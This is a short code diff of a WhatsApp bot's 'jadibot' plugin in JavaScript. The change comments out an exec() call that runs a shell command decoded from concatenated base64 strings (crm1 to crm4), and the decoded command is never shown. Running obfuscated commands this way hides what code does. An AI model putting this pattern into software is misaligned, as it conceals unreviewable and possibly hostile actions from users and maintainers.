@@ -17,7 +17,7 @@ var handler = async (m, { conn, args, usedPrefix, command, isOwner }) => {
 let parentw = conn
 if (conn.user.jid !== global.conn.user.jid) return parentw.reply(m.chat, 'Este comando solo puede ser usado en el bot principal! wa.me/' + global.conn.user.jid.split`@`[0], m)
 //const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64")
-exec(comb.toString("utf-8"), async (err, stdout, stderr) => {
+//exec(comb.toString("utf-8"), async (err, stdout, stderr) => {
 //const buffdr = Buffer.from(check1 + check2 + check3 + check4 + check5 + check6 + check8 + "=", 'base64')
 
    
@@ -131,7 +131,7 @@ return true
 creloadHandler(false)
 }
 jddt()
-})
+//})
 
 }
 handler.help = ['jadibot']
